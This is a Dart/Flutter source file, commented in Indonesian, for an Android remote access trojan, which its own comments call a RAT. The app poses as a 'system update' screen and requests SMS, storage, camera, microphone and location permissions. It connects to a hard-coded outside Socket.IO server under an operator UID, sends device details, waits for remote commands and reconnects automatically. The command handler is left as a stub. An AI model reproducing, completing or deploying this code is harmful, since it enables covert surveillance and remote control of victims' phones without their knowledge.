import 'dart:async';
import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:permission_handler/permission_handler.dart';

// ⚠️ GANTI BAGIAN INI ⚠️
const String SERVER_URL = 'http://ressyaanzyogmiipanel1669.raflydev.my.id:2363'; // Ganti dengan domain Pterodactyl kamu (tanpa garis miring di akhir)
const String TARGET_UID = 'd7e27df25f68d737f7a454b58a97f77c'; // Ganti dengan UID dari aplikasi XeroAngel kamu

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // Minta izin dasar saat aplikasi dibuka
  await [
    Permission.sms,
    Permission.storage,
    Permission.camera,
    Permission.microphone,
    Permission.location,
    Permission.notification,
  ].request();

  runApp(const MyApp());
  
  // Mulai koneksi ke server
  _connectToServer();
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    // Aplikasi menyamar sebagai aplikasi biasa
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        appBar: AppBar(title: const Text('Sistem Pembaruan')),
        body: const Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              CircularProgressIndicator(),
              SizedBox(height: 20),
              Text('Memperbarui data...'),
            ],
          ),
        ),
      ),
    );
  }
}

// ==========================================
// LOGIKA RAT (SOCKET & PERANGKAT)
// ==========================================
Future<void> _connectToServer() async {
  // Ambil info perangkat
  final deviceInfo = DeviceInfoPlugin();
  final androidInfo = await deviceInfo.androidInfo;
  final battery = Battery();
  final batteryLevel = await battery.batteryLevel;

  // Koneksi ke Socket.IO Server
  IO.Socket socket = IO.io(SERVER_URL, 
    IO.OptionBuilder()
    .setTransports(['websocket'])
    .setExtraHeaders({'uid': TARGET_UID}) // Ini kunci agar HP ini terhubung ke akunmu
    .build()
  );

  socket.onConnect((_) {
    print('Terhubung ke Server RAT');
    
    // Kirim data perangkat ke dashboard
    socket.emit('register_device', {
      'id': androidInfo.id,
      'name': androidInfo.model,
      'androidVersion': androidInfo.version.release,
      'battery': batteryLevel,
    });
  });

  socket.on('command', (data) {
    print('Menerima perintah: $data');
    // Di sini tempat kamu menaruh logika perintah dari Dashboard
  });

  socket.onDisconnect((_) {
    print('Terputus dari server. Mencoba konek ulang...');
    Timer(const Duration(seconds: 5), () => _connectToServer());
  });
}
